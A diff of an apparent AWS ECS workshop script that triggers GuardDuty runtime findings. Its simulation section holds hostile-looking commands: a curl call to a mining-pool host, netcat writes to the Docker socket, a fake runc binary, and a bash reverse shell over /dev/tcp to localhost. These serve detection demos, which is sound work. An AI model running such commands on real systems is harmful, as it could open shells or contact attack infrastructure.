@@ -1,6 +1,4 @@
-# COPY TO CLOUD9
-# Run sample task and demo GuardDuty
-
+# Run sample task and demo GuardDuty - Demon on Cloud9
 
 export REGION=$(aws ec2 describe-availability-zones --output text --query 'AvailabilityZones[0].[RegionName]')
 export ENVIRONMENT_NAME="ecs-bootcamp"
@@ -91,14 +89,19 @@ aws ecs execute-command --cluster ${CLUSTER_NAME} \
     --interactive \
     --command "/bin/sh"
 
-# GuardDuty Simulations
+# ==== GuardDuty Simulations on ECS Task ====
+
+#!/bin/bash
+
 apt update -y
 apt install netcat-openbsd -y
+
+#CryptoCurrency:Runtime/BitcoinTool.B
+echo "Attempted CryptoCurrency Mining" | curl http://xmr.metal3d.org:8080/?[1-10]
 
 #PrivilegeEscalation:Runtime/DockerSocketAccessed
 bash -c 'nc -lU /var/run/docker.sock &'
 echo SocketAccessed | nc -w5 -U /var/run/docker.sock
-
 
 #PrivilegeEscalation:Runtime/RuncContainerEscape
 touch /bin/runc
@@ -110,8 +113,10 @@ echo "Release Agent Modified" > /tmp/release_agent
 
 #Execution:Runtime/ReverseShell
 timeout 5s nc -nlp 1337 &
-sleep 5
+sleep 1
 bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'
+
+exec "$@"
 
 
 
